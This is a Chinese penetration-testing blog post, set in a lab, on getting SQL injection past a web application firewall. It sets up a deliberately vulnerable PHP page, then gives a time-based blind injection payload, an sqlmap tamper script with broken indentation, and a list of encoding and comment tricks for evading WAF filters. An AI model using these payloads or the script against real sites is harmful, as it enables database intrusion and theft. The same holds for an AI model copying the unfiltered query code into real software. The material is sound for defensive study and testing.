<!doctype html><html><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>渗透测试中的Bypass技巧（四）自动化注入 - 倾旋的博客</title><meta name=viewport content="width=device-width,initial-scale=1">
<link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/normalize.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/main.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/extra.css><link id=dark-scheme rel=stylesheet type=text/css href=https://payloads.online/css/dark.css><script src=https://payloads.online/js/feather.min.js></script><script src=https://payloads.online/js/main.js></script></head><body><div class="container wrapper"><div class=header><div class=avatar><a href=https://payloads.online/><img src=/avatar.jpeg alt=倾旋的博客></a></div><h1 class=site-title><a href=https://payloads.online/>倾旋的博客</a></h1><div class=site-description><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p><nav class="nav social"><ul class=flat><li><a href=https://github.com/rvn0xsy/ title=Github><i data-feather=github></i></a></li><li><a href=/index.xml title=RSS><i data-feather=rss></i></a></li><li><a href=/ title=Wechat><i data-feather=message-circle></i></a></li><span class=scheme-toggle><a href=# id=scheme-toggle></a></ul></nav></div><nav class=nav><ul class=flat><li><a href=/>首页</a></li><li><a href=/posts/>文章列表</a></li><li><a href=/tags>标签</a></li><li><a href=/projects>开源项目</a></li><li><a href=/about>关于我</a></li><li><a href=/links/>友情链接</a></li><li><a href=/message>留言</a></li><li><a href=/sponsor>赞助</a></li></ul></nav></div><div class=post><div class=post-header><div class=meta><div class=date><span class=day>13</span>
<span class=rest>Mar 2017</span></div></div><div class=matter><h1 class=title>渗透测试中的Bypass技巧（四）自动化注入</h1></div></div><h2 id=0x01-简单测试>0x01 简单测试</h2><p>列举一下常见的WAF：</p><ul><li>安全狗</li><li>云锁</li><li>护卫神</li><li>D盾</li><li>360网站卫士</li><li>百度云加速</li><li>阿里云云盾</li></ul><p>环境：</p><ul><li>WAF：某锁最新版本3.1.6</li><li>系统:windows 2003</li><li>WEB服务器：apache2.4.23</li><li>Php版本：php5.4.45</li><li>Mysql：5.5.53</li></ul><p>PHP SQL注入页面代码：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$link <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysql_connect</span>(<span style=color:#e6db74>&#39;127.0.0.1&#39;</span>,<span style=color:#e6db74>&#39;root&#39;</span>,<span style=color:#e6db74>&#39;root&#39;</span>)<span style=color:#66d9ef>or</span> <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;Mysql Cannot Connect&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>mysql_select_db</span>(<span style=color:#e6db74>&#39;qq&#39;</span>);
</span></span><span style=display:flex><span>$id <span style=color:#f92672>=</span> <span style=color:#a6e22e>isset</span>($_REQUEST[<span style=color:#e6db74>&#39;id&#39;</span>])<span style=color:#f92672>?</span>$_REQUEST[<span style=color:#e6db74>&#39;id&#39;</span>]<span style=color:#f92672>:</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$sql<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;select * from qq where id = &#34;</span><span style=color:#f92672>.</span>$id;
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> $sql<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;&lt;hr&gt;&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>$result <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysql_query</span>($sql)){
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>     <span style=color:#66d9ef>exit</span>(<span style=color:#a6e22e>mysql_error</span>($link));
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$data <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysql_fetch_assoc</span>($result);
</span></span><span style=display:flex><span>     
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;ID   = &#39;</span><span style=color:#f92672>.</span>$data[<span style=color:#e6db74>&#39;id&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;&lt;br&gt;&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;NAME = &#39;</span><span style=color:#f92672>.</span>$data[<span style=color:#e6db74>&#39;name&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;&lt;br&gt;&#39;</span>;
</span></span><span style=display:flex><span>     
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;AGE  = &#39;</span><span style=color:#f92672>.</span>$data[<span style=color:#e6db74>&#39;age&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;&lt;br&gt;&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></td></tr></table></div></div><p>从上方代码可以看到ID并没有做过滤</p><p>那我们现在测试一下注入点是否可以注入到数据</p><p><img src=https://images.payloads.online/d9ee0afa-4f5e-11ec-8b7b-00d861bf4abb.jpg alt="enter description here"></p><p>现在我们开启某锁漏洞防护功能</p><p><img src=https://images.payloads.online/da30f6d0-4f5e-11ec-9bd7-00d861bf4abb.jpg alt="enter description here"></p><p>下面我们开始研究bypass的方法</p><p>我们会根据以下几个知识点</p><ul><li>等价替换</li><li>大小写替换</li><li>不常用条件</li><li>特殊符号</li><li>编码</li><li>注释</li></ul><p><img src=https://images.payloads.online/da722308-4f5e-11ec-9df6-00d861bf4abb.jpg alt="enter description here"></p><p>从上面图片数据可看到 某锁防护已经拦截了我这条语句</p><p>我们先测试简单的布尔值运算</p><ul><li>And 1=1 被拦截</li><li>and &lsquo;1&rsquo;=&lsquo;1&rsquo; 被拦截</li><li>and &ldquo;1&rdquo;=&ldquo;1&rdquo; 被拦截</li><li>and &lsquo;1&rsquo;=1 被拦截</li><li>and &lsquo;1&rsquo; 不拦截</li></ul><p>意味着 某锁检测到有=符号 才给拦截的 如何绕过呢</p><p>这里我们要涉及到一个知识点</p><p>等价替换符号:</p><p>&lt; > 等价于 BETWEEN</p><p>= 等价于 like</p><p>据我所知只有那么多 还有知道的多多提供</p><p>那我们可以把“=”替换成 like</p><p><img src=https://images.payloads.online/dabad24c-4f5e-11ec-939b-00d861bf4abb.jpg alt="enter description here"></p><p>从上图可看到简单布尔值运算完全绕过某锁了</p><p>那我们继续获取数据吧</p><h2 id=0x02-继续深入>0x02 继续深入</h2><p>尝试了 联合查询注入 报错注入试了一遍还是不行</p><p>倾旋曾挖掘过一个x全狗的盲注</p><p>这时倾旋提出试试盲注呗</p><p>二话不说 上去就是干盲注</p><p><img src=https://images.payloads.online/db088a6e-4f5e-11ec-b790-00d861bf4abb.jpg alt="enter description here"></p><p>id=1 and &lsquo;1&rsquo; like IF(1 LiKe 1,1,2)</p><p>上方信息可看出使用了大小写替换而且通过if做了一次判断</p><p>If()函数：if(条件,如果真返回的值,如果假返回的值)</p><p>那我们继续往下</p><p>这时我们要讲一下等价函数</p><p>Hex() bin() 等价于 ascii()</p><p>Sleep() 等价于 benchmark()</p><p>Mid()substring() 等价于 substr()</p><p>@@user 等价于 User()</p><p>@@Version 等价于 version()</p><p>根据这些函数我们先来获取mysql root 用户的第一个首字母吧</p><p>基于时间的盲注测试</p><p>我的mysql是默认账号密码也就是第一个首字母是r</p><p>我们查一查r的ASCII码为114</p><p><img src=https://images.payloads.online/db5c8de4-4f5e-11ec-8cee-00d861bf4abb.jpg alt="enter description here"></p><p>现在我们构造语句：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>
</span></span><span style=display:flex><span>And &#39;1&#39; like IF(ascii(substr(user(),1,1)) LiKe 113,1,sleep(5))
</span></span></code></pre></td></tr></table></div></div><p>这段语句简单解释下，大牛直接跳过。</p><p>Substr()截取user()用户名第一位 为r</p><p>Ascii(‘r’) 将r 转换成ascii码</p><p>If()判断114 Like(=) 113 如果等于值为1如果不等于Sleep(延时)5秒</p><p><img src=https://images.payloads.online/dbaa6e9c-4f5e-11ec-8fbc-00d861bf4abb.jpg alt="enter description here"></p><p>可看到数据没有查出来 页面延时了5秒才加载出来</p><p>最后答案 114不等于113</p><p>剩下盲注出你想要的数据就要慢慢去测试了</p><p>最终Payload:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>and &#39;1&#39; like if(ascii(substr(user(),1,1)) like 113,1,sleep(5))
</span></span></code></pre></td></tr></table></div></div><p>能遇到某锁不拦截这些函数感觉也挺奇怪的</p><p>下面讲一下如果拦截我们应该使用什么方法绕过呢</p><p>这里只提供知识点没有实战</p><h2 id=0x03-自动化bypass扩展>0x03 自动化Bypass（扩展）</h2><p>这里扩充一下编写tamper bypass脚本</p><p>先直接使用SQLmap进行测试（毋庸置疑，肯定失败）：</p><p><img src=https://images.payloads.online/dbf66720-4f5e-11ec-bdc6-00d861bf4abb.jpg alt="enter description here"></p><p>在经过大量测试以后，我们定位特征，写出了bypass脚本：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> re
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> lib.core.enums <span style=color:#f92672>import</span> PRIORITY
</span></span><span style=display:flex><span>__priority__ <span style=color:#f92672>=</span> PRIORITY<span style=color:#f92672>.</span>LOW
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>tamper</span>(payload):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> payload:
</span></span><span style=display:flex><span>              <span style=color:#66d9ef>pass</span>
</span></span><span style=display:flex><span>              payload <span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>payload<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;SLEEP(5)&#34;</span>,<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>0</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> LikE Sleep(5)&#34;</span>)
</span></span><span style=display:flex><span>       payload<span style=color:#f92672>=</span>payload<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;&#34;</span>,<span style=color:#e6db74>&#34;/*FFFFFFFFFFFFFFFFFFFFFFFFF*/&#34;</span>)
</span></span><span style=display:flex><span>              p <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>compile(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;(\d+)=&#39;</span>)
</span></span><span style=display:flex><span>              payload<span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>sub(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#34;&#39;\1&#39;LikE &#34;</span>, payload)
</span></span><span style=display:flex><span><span style=color:#66d9ef>return</span> payload
</span></span></code></pre></td></tr></table></div></div><p>测试结果：</p><p><img src=https://images.payloads.online/dc39a562-4f5e-11ec-bb41-00d861bf4abb.jpg alt="enter description here"></p><h2 id=0x04-小总结>0x04 小总结</h2><p>等价替换</p><p>前面已经讲解了 等价函数和等价符号</p><p>大小写替换 想必这个大家应该都知道 把字母的大写小写替换下就行了例如 SeLeCt LiKe UnIoN</p><p>不常用函数
一般经常在报错注入中使用</p><p>例如floor(),extractvalue(),updatexml(),exp() 这些 原因是因为waf 可能没考虑到这些函数的危害</p><p>特殊符号</p><p>例如 <code>“+”,“-”,“@”,“！”,“~”</code>等等很多的特殊符号</p><p>比如 “+” select+password+from+mysql.user 相当于是一个空格的作用</p><p>编码
URL编码</p><p>普通的URL编码就不再过多叙述，但是在有些数据传输过程中可以采用双重URL编码测试</p><p>Unicode编码</p><p>个别特殊符号：</p><p>单引号：</p><p>%u0027、%u02b9、%u02bc%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7
空格：</p><p>%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</p><p>左括号：</p><p>%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</p><p>右括号：</p><p>%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</p><p>十六进制编码</p><p>在有的情况下通过注入点写shell的时候，我们一般把shell code转换为十六进制，其一因为数据库自动转换，其二是因为可以逃避WAF针对特殊字符拦截。</p><p>注释</p><p>某些情况下，针对不同的数据库采用不同的注释混淆，也可以bypass</p><p>普通注释 <code>/**/、-- 、# ...</code></p><p>内联注释 <code>/*!*/</code></p><hr class=footer-separator><div class=tags></div><div class=back><a href=https://payloads.online/><span aria-hidden=true>← Back</span></a></div><div class=back></div></div><div class=post><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=light_protanopia data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></div></div><div class="footer wrapper"><nav class=nav><div>2024 倾旋 All rights reserved</div></nav></div><script>feather.replace()</script></body></html>